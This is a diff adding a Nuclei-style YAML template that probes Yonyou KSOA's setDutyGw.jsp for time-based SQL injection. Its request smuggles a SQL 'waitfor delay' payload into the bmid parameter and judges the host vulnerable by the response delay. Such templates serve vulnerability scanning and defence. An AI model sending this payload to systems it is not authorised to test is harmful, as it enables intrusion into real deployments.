@@ -1,0 +1,30 @@
+id: poc-yaml-yongyou-ksoa-setdutygw-jsp-sqli
+
+info:
+  name: 用友时空KSOA setDutyGw.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1,5)}}"
+  t2: "{{to_number(t1)*2 + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/hr_dept_position/setDutyGw.jsp?delduty=1&bmid=11';waitfor+delay+'0:0:{{t1}}'--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "setDutyGw.jsp"
+          - "images_index/productCCERP.jpg"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
